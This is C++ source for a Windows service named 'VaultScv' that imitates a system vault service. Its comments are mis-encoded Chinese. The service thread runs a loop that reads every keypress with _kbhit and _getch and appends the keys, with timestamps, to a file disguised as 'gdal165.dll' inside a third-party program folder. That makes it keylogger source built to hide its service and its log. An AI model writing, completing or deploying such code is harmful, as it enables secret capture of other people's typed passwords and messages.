/*
д�˸����̼���дlog�ķ������

������ʵ�ں�̨���ܹ�������Ϊû�н��㣬ֻ����ǰ̨cmd���ڲ���ʵ�֡�



*/


#pragma warning(disable:4996)

#include <string>
#include <tchar.h>
#include <stdio.h>
#include <windows.h>
#include <winsvc.h>
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")
#include <time.h>
#include <conio.h>


#include <fstream>
using namespace std;

//typedef enum __bool { false = 0, true = 1, } bool;
//����һЩȫ�ֱ����ͺ���
void ServiceMain(DWORD argc, LPTSTR *argv);
void ServiceCtrlHandler(DWORD dwControlCode);
//SCM�������״̬��Ϣ
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode,
    DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint,
    DWORD dwWaitHint);
BOOL InitThread(); //�����߳����������ǵ�����
DWORD sysnap(LPDWORD param); //�������������Ҫ��ɵ�����
HANDLE hServiceThread;
void KillService();
char *strServiceName = "VaultScv"; //��ʶ������ڲ���
                                   //LPWSTR strServiceName = "VaultScv"; //��ʶ������ڲ���
SERVICE_STATUS_HANDLE nServiceStatusHandle; //�洢����RegisterServiceCtrlHandler���صľ��
HANDLE killServiceEvent;
BOOL nServiceRunning;
DWORD nServiceCurrentStatus;
FILE * Fces = NULL;



void main(int argc, char *argv[])
{
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    SERVICE_TABLE_ENTRY servicetable[] = { { wszClassName2,(LPSERVICE_MAIN_FUNCTION)ServiceMain },{ NULL,NULL } };
    BOOL success;
    // StartServiceCtrlDispatcher ��������ѳ������߳����ӵ�������ƹ������
    success = StartServiceCtrlDispatcher(servicetable);
    if (!success)
    {
        printf("failed!");
    }
}


void ServiceMain(DWORD argc, LPTSTR *argv)
{
    //Sleep(20 * 1000);
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    BOOL success;
    //��ServiceCtrlHandlerע��Ϊ���������,��������SCM��������������,
    nServiceStatusHandle = RegisterServiceCtrlHandler(wszClassName2, (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    //�ж��Ƿ�ע��ɹ�,���򷵻�
    if (!nServiceStatusHandle) { return; }
    //ע��ɹ�����SCM�������״̬��Ϣ,��Ϊ����û��ʼ�����,���Ե�ǰ����״̬ΪSERVICE_START_PENDING
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 1, 3000);
    if (!success) { return; }
    //����һ���¼�,�ں���������ø��¼������ֺ���������ֱ��SCM����ֹͣ����ŷ���
    killServiceEvent = CreateEvent(0, TRUE, FALSE, 0);
    if (killServiceEvent == NULL) { return; }
    //��SCM�������״̬��Ϣ
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 2, 1000);
    if (!success) { return; }
    //���ǵķ���ʼ����������,��ǰ״̬����ΪSERVICE_RUNNING
    nServiceCurrentStatus = SERVICE_RUNNING;
    success = ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0, 0, 0);
    if (!success) { return; }
    //InitThread()����һ���߳����������ǵ�sysnap()����
    success = InitThread();
    if (!success) { return; }
    //sysnap()������������֮�󷵻�ServiceMain(),ServiceMain()����WaitForSingleObject,��Ϊ����ֹ֮ͣǰServiceMain()�������
    WaitForSingleObject(killServiceEvent, INFINITE);
    CloseHandle(killServiceEvent);
}


//��SCM�������״̬��Ϣ,����˵�Ǹ�����Ϣ��,�����ܵĲ�������SERVICE_STATUS�ṹ��Ա


BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint, DWORD dwWaitHint)
{
    BOOL success;
    SERVICE_STATUS nServiceStatus; //����һ��SERVICE_STATUS���ͽṹnServiceStatus
    nServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; //��ʾ���ǵķ����Ƕ�ռһ�����̵ķ���
    nServiceStatus.dwCurrentState = dwCurrentState; //��ǰ����״̬
    if (dwCurrentState == SERVICE_START_PENDING)
    {
        nServiceStatus.dwControlsAccepted = 0; //����ĳ�ʼ��û�����
    }
    else
    {
        nServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; //֪ͨ SCM ��������ĸ����������� STOP ��SHUTDOWN ����
    }
    //dwServiceSpecificExitCode������ֹ���񲢱����˳�ϸ��ʱ�����á���ʼ������ʱ�����˳������ֵΪ 0
    if (dwServiceSpecificExitCode == 0)
    {
        nServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    }
    else
    {
        nServiceStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
    }
    nServiceStatus.dwServiceSpecificExitCode = dwServiceSpecificExitCode;
    nServiceStatus.dwCheckPoint = dwCheckPoint;
    nServiceStatus.dwWaitHint = dwWaitHint;
    //���ú�nServiceStatus��,��SCM�������״̬
    success = SetServiceStatus(nServiceStatusHandle, &nServiceStatus);
    if (!success)
    {
        KillService();
        return success;
    }
    else
        return success;
}


BOOL InitThread()
{
    DWORD id;
    hServiceThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sysnap, 0, 0, &id);
    if (hServiceThread == 0)
    {
        return false;
    }
    else
    {
        nServiceRunning = true;
        return true;
    }
}


DWORD sysnap(LPDWORD param)
{

    int ch;
    FILE *fp = NULL;
    bool printed = false;


    while (nServiceRunning)
    {
        time_t tt = time(NULL);
        tm* t = localtime(&tt);
        fp = fopen("D:\\Program Files\\Bentley\\Acute3D Viewer\\bin\\gdal165.dll", "a+");

        char time_tmp[100] = { 0 };
        if (t->tm_sec == 0 && printed == false) {
            sprintf(time_tmp, "\n%d-%d-%d %d:%d:%d\n", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);
            fputs(time_tmp, fp);
            printed = true;
        }
        if (t->tm_sec == 1)
        {
            printed = false;
        }

        if (_kbhit()) {//����а������£���_kbhit()����������
            ch = _getch();//ʹ��_getch()������ȡ���µļ�ֵ
            char tmp[10] = { 0 };
            char chr = (char)ch;
            sprintf(tmp, "%c", chr);
            fputs(tmp, fp);
        }
        fclose(fp);
    }
    return 0;
}


void KillService()
{
    nServiceRunning = false;
    ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0, 0, 0);
}


void ServiceCtrlHandler(DWORD dwControlCode)
{
    BOOL success;
    switch (dwControlCode)
    {
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    case SERVICE_CONTROL_STOP:
        nServiceCurrentStatus = SERVICE_STOP_PENDING;
        success = ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0, 1, 3000);//�ȸ��·���״̬ΪSERVICDE_STOP_PENDING,��ֹͣ����
        KillService();
        return;
    default:
        break;
    }
    ReportStatusToSCMgr(nServiceCurrentStatus, NO_ERROR, 0, 0, 0);
}